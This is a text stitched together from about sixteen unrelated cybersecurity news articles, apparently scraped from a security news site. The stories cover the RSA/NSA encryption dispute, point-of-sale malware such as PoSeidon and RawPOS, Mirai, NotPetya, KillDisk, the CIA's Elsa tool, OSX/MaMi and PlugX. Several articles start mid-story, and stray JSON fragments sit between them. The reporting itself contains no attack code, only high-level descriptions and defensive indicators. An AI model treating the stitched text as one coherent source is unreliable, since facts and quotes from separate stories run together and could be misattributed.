The allegation against RSA, now a division of EMC, surfaced last week in a report by Reuters that said the company took $10 million from the security agency to make sure the Dual Elliptic Curve Deterministic Random Bit Generator (Dual EC DRBG) was used by default in BSAFE. The algorithm was found to be flawed as early as 2006. However, the company kept using it by default until September, when the National Institute of Standards and Technology (NIST) advised organizations to stop using it. In a letter to EMC CEO Joseph M. Tucci and Art Coviello, executive chairman of RSA, Hyponnen said he was backing out of his talk, which ironically was called 'Governments as Malware Authors.' \"I don’t really expect your multibillion dollar company or your multimillion dollar conference to suffer as a result of your deals with the NSA,\" Hypponen wrote. \"In fact, I'm not expecting other conference speakers to cancel. Most of your speakers are American anyway – why would they care about surveillance that’s not targeted at them but at non-Americans. Surveillance operations from the US intelligence agencies are targeted at foreigners. However I’m a foreigner. And I’m withdrawing my support from your event.\" RSA said it had no comment on the matter when contacted by SecurityWeek. However, the company did issue a statement recently saying it had never engaged in any contract or project with the intent of weakening their own products or introducing backdoors for the NSA to use. \"We made the decision to use Dual EC DRBG as the default in BSAFE toolkits in 2004, in the context of an industry-wide effort to develop newer, stronger methods of encryption,\" according to the company's statement. \"At that time, the NSA had a trusted role in the community-wide effort to strengthen, not weaken, encryption.\" The RSA conference runs from Feb 24 to 28 and will be held in San Francisco.

PoSeidon was publicly identified by Cisco Systems back in March. According to Cisco, the malware scrapes memory in order to find number sequences that match up with formats used by Visa, MasterCard, AMEX and Discover, and uses the Luhn algorithm to verify whether credit or debit card numbers are valid. \"PoSeidon was professionally written to be quick and evasive with new capabilities not seen in other PoS malware,\" members of Cisco’s Security Solutions team blogged. \"PoSeidon can communicate directly with C&C servers, self-update to execute new code and has self-protection mechanisms guarding against reverse engineering.\" In the attack reported by RSA, the email in question was sent using a domain resembling one legitimately registered by a restaurant in New York City. The email contained a Word document that dropped the Vawtrak banking Trojan. \"The recipient email address was associated with an Exchange distribution email list of a popular POS vendor in Europe,\" blogged RSA's Kent Backman. \"The recipient email address could be found using an Internet search engine.  We do not know if this exploitation campaign was successful.\" \"The spoof domain was registered using the email address SILLITOEXPYA(at)RAMBLER.RU,\" he continued, adding that the email address had been used to register 40 other domains, many of which link to multiple malware campaigns. Three of the domains were highlighted by Cisco’s Talos threat intelligence team in its investigation of PoSeidon. Several samples of malware called out to the domains also used by PoSeidon, he noted. \"It is possible that the merchant being spoofed could be a customer of the targeted POS vendor,\" blogged Backman. \"We do not know if the domain and crafted email was created as “one-off” infrastructure specifically to target the European POS vendor, or multiple vendors.  However, we do know that the mail exchange (MX) record for the restaurant spoof domain stopped resolving to the IP address 31.184.192.215 shortly after the malicious attachment was processed by VirusTotal, suggesting some attempt by the actors to cover their tracks after a possibly unsuccessful exploitation campaign. The MX record could have been in place to allow two-way email interaction with victims targeted with the malware attachment.\" The ultimate goal of the attackers may not have been to compromise the PoS vendor, he added. Instead, they may actually be trying to subvert the entire supply chain. \"The threat’s principle objective may be to establish lateral access to merchants and their point of sales systems: the source of payment card info,\" he explained. \"It should be noted,\" he blogged, \"that the POS vendor targeted in this campaign posted on their website more than one hundred business logos representing 82 commercial partners, 35 technological partners and 18 solution integrators.

The Las Vegas-based company, which operates casinos in several U.S. cities, said customer credit and debit card information at all of its Casinos was compromised in a breach that occurred between March 14 and October 16. The company described the issue as \"an unauthorized intrusion into the system that processes customer credit and debit cards.\" Affinity is urging all customers who visited its gaming facilities during the seven-month window to take urgent steps to protect their identities and financial information. Affinity also acknowledged a separate hack into the system that processes credit and debit cards at its Primm Center Gas Station in Primm, Nevada.  \"This intrusion began on an unknown date and it ended on November 29, 2013,\" the company said. From the company's statement:   On October 24, 2013, Affinity was contacted by law enforcement regarding fraudulent charges which may have been linked to a data breach in Affinity's system. Affinity immediately initiated a thorough investigation, supported by third-party data forensics experts who determined the nature and scope of the compromise, and confirmed that Affinity's system has been fully secured and that its customer payments are protected.  On November 14, 2013, Affinity posted notice of this incident on its website. Affinity said its investigation determined that malware was used in the attack at its casinos in Nevada, Iowa, Missouri and Colorado. \"Credit or debit card data was exposed at these locations between March 14th and October 16th of 2013,\" the company warned. Affinity did not say how many customers were affected by the breach. " }

One of Esteves’ services was a website called reFUD.me. Created in February 2015, the site allowed cybercriminals to learn if their malware samples would be detected by antiviruses from various vendors. When it was shut down several months later, the service claimed that it had been used to conduct 1.2 million scans. The man, known online as KillaMuvz also created Cryptex, a tool that allowed malware developers to encrypt their files in an effort to make them more difficult to detect. Cryptex had been available since October 2011, but it had been improved over time. Use of the reFUD and Cryptex tools was not free. For example, users had to pay $8 per month for the lite version of Cryptex or $90 for a lifetime license for Cryptex Reborn, which experts described as highly sophisticated. Esteves and a woman were arrested in November 2015 as a result of an investigation conducted by Trend Micro and the UK’s National Crime Agency (NCA). Both services were shut down around the time of their arrest. A local news site reported in March 2017 that Esteves had pleaded not guilty to four charges of computer misuse and one charge of obtaining money under the Proceeds of Crime Act 2002. The man insisted at the time that his software was designed for legitimate use. However, the NCA announced this week that Esteves has pleaded guilty to two computer misuse charges and one count of money laundering. He will be sentenced on February 12. Authorities said Esteves received roughly £32,000 ($44,000) for his services between 2011 and 2015. However, this only represents payments made through PayPal; the actual profit is likely much higher since he also accepted payment in bitcoins and Amazon vouchers. " }

The first reports about Mirai were largely ignored by the industry, but the massive distributed denial-of-service (DDoS) attacks launched against the website of journalist Brian Krebs and hosting provider OVH brought the Trojan into the spotlight. When he decided to release the source code, the author of Mirai claimed his creation had infected as many as 380,000 devices, but the number had started to drop after the malware made the news. Researchers at Level3 Communications have been monitoring Mirai and determined that the number of bots more than doubled following the source code leak. By monitoring the malware’s command and control (C&C) servers, the company has identified nearly 500,000 infected IoT devices, and the actual number is likely even higher. These devices are part of multiple new botnets created after the source code was made public. In some of the DDoS attacks observed by Level3, cybercriminals used as many as 100,000 bots against a single target. Experts from various security firms warned that there are hundreds of thousands of devices from vendors such as Taiwan-based AVTECH, and China-based Dahua Technology and XiongMai Technologies that could easily get infected with Mirai malware. While more than 80 percent of bots are DVRs, the malware is capable of finding and infecting various types of products, including routers, IP cameras, Linux servers and even rugged gateways from Sierra Wireless. According to Level3, more than a quarter of infected devices are located in the United States, followed by Brazil (23%) and Colombia (8%). Experts pointed out that nearly a quarter of Mirai bots had also been infected with Gafgyt (aka BASHLITE), another highly popular IoT malware. “Such a high overlap indicates that multiple malware families are targeting the same pool of vulnerable IoT devices,” Level3 explained in a blog post. Interestingly, researchers noticed that Mirai’s C&C servers had been targeted on several occasions in DDoS attacks launched using BASHLITE botnets. “With the recent and frequent introduction of new Mirai variants, we expect continued DDoS activity from Mirai botnets,” experts said. “The structure of these botnets is evolving as different owners adapt the malware. In some cases, we see the new variants running all of their infrastructure on one or two hosts, as opposed to the original Mirai variant which had many different hosts and frequently changed IPs to avoid detection or attack.” " }

Many Mac users live with the impression that their devices and their data can't be harmed by malware. While the volume of Mac threats is insignificant compared to ones targeting Windows, there have been a few pieces of malware that have infected a large number of devices, such as the Flashback Trojan, which is said to have hit over 600,000 computers.  Security companies have often warned users about the risks posed by Mac malware and many of them offer products designed for Apple's operating system. Antivirus testing firms AV-Comparatives and AV-TEST have put several of these products to the test to find out how efficient they are in detecting Mac malware. AV-Comparatives has tested eight products, while AV-TEST analyzed a total of 18 paid and free products. AV-Comparatives tested solutions from Avast, Avira, Bitdefender, ESET, Intego, Kaspersky, Sophos and Kromtech to determine the level of protection against both Mac and Windows malware. The report shows that the products from Avast, ESET, Intego and Sophos detected all of the 65 recent and prevalent Mac malware samples (ones that are not blocked by Mac OS X Maverick). Avira scored 91%, Bitdefender 98%, Kaspersky 97% and Kromtech 80%. Except for the Intego solution, all products detected 100% of the Windows malware.  In addition to testing protection, AV-Comparatives analyzed the ease of use and help functions of products. AV-TEST has focused on detection, performance and features, but they haven't included Windows malware in their tests. The company says it plans on reviewing Linux products in around 2-3 weeks. Detection rates for the 18 free and paid products reviewed by the company ranged from 20-100%, with Bitdefender, G Data and Norman solutions at the top of the chart - all with 100% scores. Products from Microworld, ESET, F-Secure, Intego, Avast, Panda, Sophos and Kaspersky have all detected over 90% of the 117 malware samples. It's worth noting that products from G Data, Norman and Microworld use the antivirus engine from Bitdefender.  Comodo and AVG antiviruses are just above the 80% mark and Avira scored 68.4% (on demand). Surprisingly, some of the big names are the bottom of the chart: Symantec (54%), Trend Micro (38%), McAfee (26%) and Webroot (19%).  Webroot representatives told SecurityWeek that its product's efficacy was negatively impacted by a recently discovered bug that has been fixed since. While the company says it recognizes the importance of laboratory tests, it remains confident in the efficiency of its product in a real-world environment. As far as performance is concerned, AV-TEST copied 7.4 Gb of files to see how many seconds it would take to complete the process with and without antivirus products installed. Without the applications installed, it took 17.2 seconds. With the security software installed, it took less than 21 seconds in most cases. Microworld and Trend Micro came in last with 40.4 and 470.3 seconds, respectively. Most of the products analyzed by AV-TEST don't have any extra features such as anti-spam, anti-phishing, personal firewall, parental control, backup and encryption. ESET Cyber Security Pro has the most extras, but it's worth noting that it's a paid product. Both AV-TEST and AV-Comparatives tested the products for false positives. There were no false alarms for any of the products reviewed by the labs.  The complete reports from AV-TEST and AV-Comparatives are available online. *Updated with commentary from Webroot " }

While initial analysis suggested that this was a Petya-powered ransomware attack similar to WannaCry, further investigation revealed that the malware is actually designed to overwrite the master boot record (MBR) of compromised machines. There is no way to recover encrypted files, even if the ransom is paid.  The wiper, tracked as NotPetya, Petya.A, Petrwrap, exPetr, and GoldenEye, has leveraged various tools and exploits for initial infection and lateral movement within a network. While major organizations around the world were hit by the ransomware, some evidence suggests that the attack may have actually been aimed at Ukraine. Industry professionals have commented on the NotPetya campaign, including its implications, attribution, and why these types of attacks are still possible. And the feedback begins… Nir Giller, CTO, CyberX: \"Let's face it — when the Shadow Brokers leaked the NSA’s hacking tools, they let the genie out of the bottle and there’s no putting it back in. We should expect to see all kinds of cyber-adversaries playing with and building on top of them. Some of us in the ICS cyber security community are braced for the worst - mainly that some creative hacker will find a way to cross-pollinate elements of WannaCry/Petya with the destructive payloads of the ICS-specific Industroyer/CrashOverride malware. If that were to happen, then we're playing a whole new ballgame.\" Paul Innella, CEO, TDI: \"There are strict physical safety measures imposed on numerous industries like seat belts and airbags, yet we need look only at the current U.S. administration and their public stance on cybersecurity to see an instance of unbelievably insufficient governmental policy.  The entire Intelligence Community and the cybersecurity community which supports the government knows and has known the Russians have sophisticated teams and methodologies which have been attacking us for years. This administration seems to have turned a blind eye on our national defense given their consistent refusal to admit Russia’s complicity. This makes a bold statement that the White House has no intention of preventing, at a policy level, cyber-attacks. There are still gaping holes in the Federal CISO and White House CISO positions and we’ve not received any movement in policies or executive orders of any substance.\" Jason Kichen, Head of Cybersecurity Services, Versive: “The evidence suggesting this week’s so-called ‘Petya’, or ‘NotPetya’ ransomware attack is, in fact, a destructive wiper-like attack points to the potential for even deeper concealment and cover techniques as different actors are emboldened to employ more attacks. The forensic analysis of this malware seems to indicate that it’s not ‘true’ Petya ransomware, but probably came from the same codebase. Someone picked up Petya, made a series of modifications, and sent it on its way with a new destructive mission. The modifications to the malware do not make it any better or stronger or more effective as a ransomware tool, but they did make it more effective as a destructive tool and – more importantly - kept a lot of people distracted with the ransom angle for days.   This possible deception reveals a key point: Considering the publicity that ransomware attacks receive, it would make a lot of sense to execute a targeted, destructive cyber-attack under the guise of a seemingly opportunistic, criminal-driven ransomware spree. Equally important – an attacker does not need a lot of advanced knowledge or tools to pull this off, re-purposing malware from the wild is commonplace, and packaging in leaked exploits requires only slightly more expertise. In so far as true attribution is even possible, there is likely far more to be learned by focusing on the specific Ukrainian victims and the initial attack vectors, versus the specifics of how the ransomware functioned.” Tom Kellermann, CEO, Strategic Cyber Ventures: “From Russia with love... The Cyber siege of Ukraine harkens the escalation of the conflict along the border with Russia. This cyber pulse is being directed by the Kremlin and is using cyber militias like CyberBerkuit to take down critical infrastructure. This should serve as a warning to NATO members that Putin is ready to take the gloves off.” Hank Thomas, COO, Strategic Cyber Ventures: “A senior Ukrainian Military Intelligence official was killed in a car bomb yesterday in Kiev. The Russians appear to be expanding their multi domain approach to their current campaign. Expect for there to be destructive attacks in the near future facilitated by cyber means. Much of what is going on right now is simply armed reconnaissance or reconnaissance by fire.” Travis Farral, Director of Security Strategy, Anomali: “A number of us in the security community are debating if the Petya attack on 27 June wasn’t a targeted attack on Ukraine, disguised as a ransomware attack on any organization caught up in the method used for infection.   There are details that support such a theory. The attackers behind the ransomware haven’t experienced much ROI despite the broad impact of the attack, they set up a weak payment process, launched the attack just prior to Ukraine’s Constitution Day and leveraged a malware family named for the pet name of Ukrainian President, Petro Poroshenko.   Intelligence is leaning towards the idea that the impact the attack had on Ukraine was a causal effect, and entities affiliated with campaign were caught in the crossfire of destruction or a diversion rather than ransom collection.” Ajay Arora, CEO and Co-Founder, and Tom Conklin, Head of Security and Compliance, Vera: \"Companies are not keeping pace with the attackers. They are slow to patch and running vulnerable environments. While IT is patching yesterday's attack the threat has evolved and attackers have moved on.   Our corporate culture is to blame. Many companies are either lacking the resources to aggressively patch, or they are concerned that patches could affect system availability (SLAs) so there is an incentive that if it ain't broke don't fix it.   This primarily affected European countries with the exception of Merck, for two reasons: They are much more lax about keeping up-to-date on patches, and they have a ton of pirated or illegal copies of software and thus don’t update software.   The NSA and government should do something about the genie that they let out of the bottle that is being exploited. They should be actively working to provide tools and at least recommendations as to how to close the vulnerabilities that they revealed. It’s costing the world countless amounts of dollars and is allowing the attackers to mount cyber warfare against companies, rather than simple theft.\" Ryan Kazanciyan, Chief Security Architect, Tanium: “Many anti-malware tools focus on the most common vectors used in attacks: exploits delivered through office applications, web browsers and plug-ins, etc. As we've come to see, this distant-cousin of Petya was different: victims were infected by means of a third-party application's automatic update function. Did some prevention software still catch the malware on day zero? Sure. But for plenty of others, this attack highlighted a blind spot. The so-called \"next-gen EPP\" market is now several years old, yet this generation still feels a whole lot like past ones. Attackers continue to innovate, adapt, and succeed against automated anti-malware solutions.   The solution isn't to simply revisit our approach to malware detection and prevention yet again. Both WannaCry and this recent attack highlight fundamental failures of systems management technologies (and the processes built around them). [...] Time and time again, incidents like these demonstrate that businesses cannot ignore the root of their security problems in favor of quick band-aid solutions. There are far greater gains to be made by modernizing environments, adopting security mechanisms built into the latest operating systems, and building networks that are far more resilient to compromise or failure.” Philip Lieberman, President, Lieberman Software: “The quality and nature of cybersecurity within Europe is generally exceedingly poor compared to the United States. Government and industry are not operating in a cooperative manner as they do here in the US and the level of investment in security is comparatively very low as compared to here. At its core, Europe is a soft target for cyber attacks and there is little they have done to prepare or to react to the attacks. The lack of information technology security infrastructure and preparation is minimal in both government and businesses because of cultural and financial decisions of the last 20 years.” Milind Kulkarni, vice president of product management, Veriflow: \"The 'Petya' ransomware malware responsible for Tuesday's attack was especially virulent for two reasons; it appeared to use code sourced to NSA's stolen hacking arsenal that was distributed by Shadow Brokers in March. Many of those tools consisted of zero days, which are impervious to most (if not all) network security products on the market. Second, the malicious code, appears to have been tweaked to behave similarly to the devastating 'WannaCry' ransomware attack in May. Both Petya and WannaCry spread laterally through open networks once they compromised a system. With this one-two punch, attackers were able to quickly take entire networks offline.   Because today's network security products are essentially ineffective against zero-day malware, it is important for organizations to implement some form of network segmentation. Network segmentation splits networks into isolated subnetworks. The advantage to this approach is that it can increase network performance and overall network security. Using network segmentation, critical data and infrastructure can be isolated in one network segment, while employees are isolated in another. What's more, employees and data could be microsegmented into even smaller groups. So, in the event of a catastrophic zero-day attack, the malware would only be able to affect those systems within the defined segment and would not be able to spread to other systems in the network.\" " }

The threat, known as RawPOS, has been around since 2008 and is considered one of the earliest pieces of malware designed for credit and debit card data theft. Last month, Visa issued a security alert to warn lodging merchants that malicious actors had been infecting global organizations with RawPOS at an alarming rate. One of the more recent incidents involving this piece of malware was the C&K Systems breach, which affected Goodwill Industries International. According to a detailed report released on Wednesday by Trend Micro, the latest victims of RawPOS are casinos, resorts and luxury hotels in the United States and Canada. Some victims have also been spotted by the security firm in Europe, the Middle East and Latin America. RawPOS is a highly configurable, multi-stage memory scraper that has evolved over the past years. Its modular design has enabled attackers to adapt the threat to the targeted environment. The malware has three main components: a service that installs a backdoor in order to maintain persistence on the infected device, a memory dumper which dumps the memory of specific processes, and the scraper component which scrapes payment card data from the files dumped by the memory dumper. In older versions of the threat, the persistence service called the memory dumper directly, but the versions spotted in 2014 and 2015 are designed so that the file data scraper calls the memory dumper, researchers noted. Because different organizations might use different PoS software, RawPOS is designed to support multiple PoS applications. The samples identified by Trend Micro in 2014 and 2015 were capable of targeting software such as Siriusware, InfoGenesis, Micros, Oracle Application Server, Radiant CounterPoint, Retail Pro, and Shift 4. “We also saw that attackers may have used the generic memory dumper to enhance the process-specific dumper as they encounter it, dropping or adding of specific processes as they learn about newer environments. This prevented repeat work of guessing which process within the PoS software suite to dump that may have the credit card information,” Trend Micro said in its report on RawPOS. The security firm warns that it’s not easy for organizations to protect their systems against RawPOS because the malicious files used by the attackers might have been specifically generated for the targeted environment. “The service names may have changed, as well as any file name reference and timed execution events for the memory dumper and file data scraper. Also, the attackers use standard administrative tools (like psexec.exe, far.exe, radminshare.exe, rstopservice.exe, etc.) for lateral movement and data collection,” Trend Micro noted. Last month, the security company published a paper on the strategies and technologies that can be used to defend an organization against PoS RAM scrapers. " }

Think again.  Webcam spying may have just gotten a little bit easier. According to new research from Johns Hopkins University, it is possible on some older Mac computers for malware to disable the warning light that indicates the webcam is on. In a new paper, Johns Hopkins graduate student Matt Brocker and Assistant Research Professor Stephen Checkoway revealed that there is a way to disable the LED [light-emitting diode] on certain Apple internal iSight webcams used in versions of MacBook laptops and iMac desktops.   \"The same technique that allows us to disable the LED, namely reprogramming the firmware that runs on the iSight, enables a virtual machine escape whereby malware running inside a virtual machine reprograms the camera to act as a USB Human Interface Device (HID) keyboard which executes code in the host operating system,\" the researchers wrote. \"We [built] two proofs-of-concept: (1) an OS X application, iSeeYou, which demonstrates capturing video with the LED disabled; and (2) a virtual machine escape that launches Terminal.app and runs shell commands.\"   The researchers looked at webcams installed in iMac and MacBook computers released prior to 2008 for their study.   \"Disabling the indicator LED on the iSight entails two requirements,\" they wrote. \"First…the indicator LED is directly connected to the STANDBY pin on the image sensor. In order to disable the LED, we need to keep STANDBY asserted. Since asserting STANDBY will disable the image sensor output, we need to configure the image sensor to ignore STANDBY before we assert this signal. Second, we need a way to modify the firmware on the EZ-USB to in order to configure the image sensor appropriately as well as keep STANDBY asserted whenever we want the LED to stay off.\"   The researchers also presented possible hardware and software changes that can prevent their attack. In the future, the researchers said they plan to examine newer webcams as well.   \"There has been a long and sordid history of internet perverts and peeping Toms hacking into computers, and secretly taking images and videos of their victims via the webcam,\" blogged security researcher Graham Cluley. \"One recent victim was Miss Teen USA Cassidy Wolf, who was secretly spied upon in her bedroom by a hacker who took photographs and threatened to release them to the public.\"   \"Whether the hackers are doing it for sexual kicks or with the intention of blackmail doesn’t really matter – it’s a gross invasion of privacy, and can leave the victim feeling shaken and abused,\" he added.

The security firm is in the process of examining the new variant and the attacks, but an initial analysis showed that the Trojan appears to be delivered by a different piece of malware or it may be part of a bigger attack. Early versions of KillDisk were designed to wipe hard drives in an effort to make systems inoperable. The malware was used by the Russia-linked threat actor BlackEnergy in the 2015 attack aimed at Ukraine’s energy sector. Roughly one year after the Ukraine attack, researchers reported that its developers had turned KillDisk into file-encrypting ransomware. However, the samples analyzed at the time used the same encryption key for all instances, making it possible for victims to recover files. Experts later reported seeing a KillDisk ransomware designed to target Linux machines, but the malware did not save encryption keys anywhere, making it impossible to recover files. Some links have also been found between KillDisk and the NotPetya malware, which initially appeared to be a piece of ransomware but later turned out to be a disk wiper. NotPetya hit machines in more than 65 countries and major companies reported losing hundreds of millions of dollars as a result of the attack. The latest variant, which Trend Micro tracks as TROJ_KILLDISK.IUB, goes back to its roots and focuses on deleting files and wiping the disk. The malware, designed to target Windows systems, goes through all drives in order to delete files, except for system files and folders. It then proceeds to wipe the disk, which includes reading the master boot record (MBR) and overwriting the extended boot record (EBR). The file removal and disk wiping procedures involve overwriting files and disk sectors in order to make recovery more difficult. Once files and partitions have been deleted and overwritten, the malware attempts to terminate several processes in an effort to reboot the infected machine. By targeting processes associated with the client/server runtime subsystem (csrss.exe), Windows start-up (wininit.exe), Windows logon (winlogon.exe), and the Local Security Authority Subsystem Service (lsass.exe), the malware can force a blue screen of death (BSOD), a logout, or a restart. Trend Micro has promised to share more information on the new KillDisk variant as its investigation continues. " }

According to its developers, Elsa provides geolocation data by recording the details of Wi-Fi access points, including signal strength, in range of the targeted Windows device. The user’s location and movements can be obtained after the data is sent to third-party location services. Once Elsa is planted on the target’s computer, it monitors nearby Wi-Fi connections even if the device is not connected to the Internet. Once an Internet connection is available, the malware can send the collected Wi-Fi data to a database containing the geographical location of wireless access points. The document made available by WikiLeaks showed that Elsa leveraged geolocation databases set up by Google and Microsoft. The data is encrypted and logged, and the malware’s operator can manually retrieve this log by connecting to the infected device. “The ELSA project allows the customization of the implant to match the target environment and operational objectives like sampling interval, maximum size of the logfile and invocation/persistence method,” WikiLeaks said. “Additional back-end software (again using public geo-location databases from Google and Microsoft) converts unprocessed access point information from exfiltrated logfiles to geo-location data to create a tracking profile of the target device.”  The user manual leaked by WikiLeaks as part of its Vault 7 dump is dated September 2013, which indicates that the tool may have been improved significantly if it’s still maintained by its developer.  Earlier this month, WikiLeaks also published documents detailing tools allegedly used by the CIA to spread malware on a targeted organization’s network (Pandemic), hack routers and access points (Cherry Blossom), and hack air-gapped networks using USB drives (Brutal Kangaroo). WikiLeaks has also detailed tools designed for replacing legitimate files with malware, hacking Samsung smart TVs and routers, MitM tools, a framework used to make malware attribution and analysis more difficult, and a platform for creating custom malware installers.  Security firms have found links between the tools exposed by Wikileaks and the malware used by a cyber espionage group tracked as “Longhorn” and “The Lamberts.” " }

The ideal scenario for profit-driven hackers is to find and exploit security holes in plugins installed on hundreds of thousands or millions of websites. However, targeting a large number of less popular applications can also be profitable. A good example is WP Marketplace, a WordPress shopping cart/e-commerce plugin installed on less than 500 websites. WP Marketplace is no longer maintained, which means that vulnerabilities are unlikely to ever get patched. Last week, researchers at White Fir Design started seeing requests for a file associated with WP Marketplace. They quickly determined that attackers were most likely trying to find websites running WP Marketplace in an effort to exploit an arbitrary file upload vulnerability. Sucuri has also observed attack attempts in the wild. According to the security firm, cybercriminals have been exploiting the vulnerability to upload a commonly used backdoor. “Of course, it is not as valuable for hackers as vulnerabilities in popular plugins installed on every other site, but if your toolkit comprises hundreds of smaller vulnerabilities, the success rate will be comparable,” said Sucuri’s Denis Sinegubko. “That’s why plugin developers shouldn’t neglect best security practices even when developing small plugins.” WP Marketplace, which hasn’t been updated in the last 8 months, was removed last week from the official WordPress Plugin Directory. White Fir Design pointed out that its developers also offer several other plugins, including WordPress Download Manager, which has tens of thousands of active installs. However, security doesn’t appear to be a priority. A file upload flaw discovered by White Fir Design nearly four months ago in the WordPress Download Manager is still unpatched. Ecommerce websites are increasingly targeted by cybercriminals. Experts recently discovered thousands of compromised online shops set up to steal users’ payment card information.

The largest new attack was 137.88 Gbps, the firm reported. Arbor Networks monitored 126,000 SSDP reflection attacks in the first quarter of the year compared to 83,000 in the fourth quarter of 2014. The numbers also represent a dramatic spike from Q1 2014, when Arbor Networks observed just three such attacks. A report recently released by NSFOCUS linked the ever-growing Internet of Things (IoT) to an increase in SSDP reflection attacks during the second half of 2014. More than 30 percent of compromised SSDP attack devices were network-connected devices such as home routers and webcams, according to the firm. \"With the proliferation of the Internet of Things, any smart connected device with a public IP address and vulnerable operating system will increase the number of devices that could be used to launch SSDP–based reflection attacks,\" according to the NSFOCUS report. \"This particular type of DDoS attack was seen as the second most dominant threat, after NTP-based (Network Time Protocol) attacks, in 2H2014.\" Most of these IoT devices are very low cost, rarely if ever monitored and are often easily exploitable, said Gary Sockrider, solutions architect for Arbor Networks. \"As more of these devices come online they become ever more inviting targets,\" he said. \"Many of these devices have Universal Plug and Play (UPnP) enabled by default, which relies upon SSDP, and we’ve seen a sharp and continued rise in SSDP based attacks.\" Overall, the attacks monitored by Arbor Networks were shorter but packed a more powerful punch. Ninety percent of the attacks lasted less than an hour. The top overall attack targets were the U.S. (16 percent), China (16 percent) and France (8 percent). The top targets for reflection attacks of more than 10Gbps were France (19 percent), Denmark (10 percent) and the U.S. (8 percent). Roughly 43 percent of reflection attacks targeted port 80. \"Attacks that are significantly above the 200Gbps level can be extremely dangerous for network operators and can cause collateral damage across service provider, cloud hosting and enterprise networks,\" said Darren Anstee, director, solutions architects, for Arbor Networks, in a statement. \"DDoS attacks continue to evolve. Not only have volumetric attacks grown significantly in size and frequency over the past 18 months, application-layer attackers are also still pervasive. In order to deal with the full scope of the modern DDoS threat, we strongly recommend a multi-layered defense, one that integrates on-premise protection against application-layer attacks with cloud-based protection against higher magnitude volumetric attacks. Only then is an organization fully protected from DDoS attacks today.\" " }

After polling 676 security practitioners with involvement in endpoint security, Ponemon found that 75% of the respondents identified mobile devices such as smart phones as \"the greatest risk of potential IT security risk within the IT environment.\"  The study, commissioned by Lumension, confirmed that managing risk at the endpoint layer is \"more difficult than ever\" with 71% of the security professionals saying the security threats created by vulnerabilities to the endpoint have become more difficult to stop or mitigate.  According to the survey, 68 percent say their mobile devices have been targeted by malware in the last 12 months, yet 46 percent of respondents say they do not manage employee-owned mobile devices. Another big headache heading into 2014 is the issue of APTs (advanced persistent threats) or targeted attacks using customized malware. The Ponemon study found that 39% of those surveyed report APTs as one of their most concerning risks, up 55 percent from 2009.  While 40% report they were a victim of a targeted attack in the last year, another 25% say they aren't sure if they have been, revealing many organizations don't have security mechanisms in place to detect such an attack.  The respondents also report the volume of malware continues to be an escalating problem. More than 40% said they experienced more than 50 malware attacks a month, up 15 percent from those that reported that amount three years ago.   Although there is a recognition that malware attacking the endpoint should be a top priority, the security pros report that budgets are still lagging behind. In the past 24 months, the Ponemon study found that only 29% reporting that spending has either significantly increased or increased for endpoint security during that time.  \"Malware incidents are straining IT security budgets,\" it said. About 50% of respondents say their organization's IT operating expenses are increasing and this is an increase from 46 percent of respondents in 2012.  Almost 70% said malware incidents contributed a very significant or significant increase in these expenses, up slightly from 64 percent in 2012.

The threat has other capabilities as well, but they do not appear to be active. The malware, dubbed OSX/MaMi by Wardle based on a core class named “SBMaMiSettings,” is currently only detected – at least based on its signature – by ESET and Ikarus products as OSX/DNSChanger.A and Trojan.OSX.DNSChanger. However, other vendors will likely create signatures for the threat in the upcoming hours and days. The researcher obtained a sample of MaMi after a user reported on the Malwarebytes forums that a teacher’s Mac had been infected. The user reported that the DNS servers on the compromised system were set to 82.163.143.135 and 82.163.142.137, and they kept changing back after being removed. Wardle has not been able to determine how the malware is being distributed, but he has found it on several websites. The expert believes the threat has likely been delivered via email, fake security alerts and pop-ups on websites, or social engineering attacks. The sample analyzed by the researcher acts as a DNS hijacker, but it also contains code for taking screenshots, simulating mouse events, downloading and uploading files, and executing commands. The malware does not appear to execute any of these functions, but Wardle says it’s possible that they require some attacker-supplied input or other preconditions that his virtual machine may not have met. The researcher says he will continue to investigate. Once it infects the system, the malware invokes the security tool and uses it to install a new certificate obtained from a remote location. “OSX/MaMi isn't particular advanced - but does alter infected systems in rather nasty and persistent ways,” Wardle explained. “By installing a new root certificate and hijacking the DNS servers, the attackers can perform a variety of nefarious actions such as man-in-the-middle'ing traffic (perhaps to steal credentials, or inject ads).” The easiest way to determine if a macOS system is infected with the MaMi malware is to check DNS settings – the threat is present if the server is set to 82.163.143.135 and 82.163.142.137. The malware does not appear to be designed to target Windows devices. The most well known DNS-changer malware is DNSChanger, a threat that made rounds in the years leading up to 2011 and which changed DNS settings as part of clickjacking and ad replacement fraud schemes. DNSChanger affected both Windows and OS X machines, and millions of devices worldwide were at risk of losing Internet connectivity after authorities took down its infrastructure. " }

Palo Alto Networks has spotted several interesting PlugX samples believed to have been used by the same threat actor. While the company has not provided any details on the actor behind these attacks, PlugX has often been used by China-linked threat groups. The attacks start with a malicious Word document named “New Salary Structure 2017.doc,” which exploits CVE-2017-0199, an Office vulnerability that has been used by several threat actors, including ones linked to China and Iran. The exploit downloads a Windows installer file and a PowerShell script that appears to be based on an open source Ruby exploitation library. Both files can load a shellcode designed to unpack the main PlugX DLL in memory. The shellcode is loaded only after the presence of a virtual environment is checked. The PlugX samples analyzed by Palo Alto Networks contacted several Pastebin URLs containing the addresses of command and control (C&C) servers. The content is encoded via a technique that PlugX has been known to use. Researchers have described these PlugX samples as “paranoid” due to the fact that the batch script responsible for executing the malware also attempts to clean up after itself by deleting all files created during installation and initial execution, registry keys, and UserAssist key entries. “Clearly the attacker using this PlugX is paranoid about it being detected on disk, both in the registry and the file system. To top this off the script runs most of the deletion commands more than once,” experts said in a blog post. “The result is that there should be no evidence that the malware was ever executed on the disk, making it harder for forensics teams to identify how the malware got there, and meaning that memory or network based detection would be required to identify the intrusion.” Researches noticed that, in the first half of this year, the developers of these “paranoid” samples also added mechanisms for bypassing application whitelisting techniques possibly used by their targets. They achieved this by using code made available on GitHub by a user named “SubTee” and, in some cases, they also added some custom code. While Palo Alto Networks reported that these attacks appear to mainly target the video game industry, the company believes other types of organizations that are outside its telemetry may have been targeted as well.

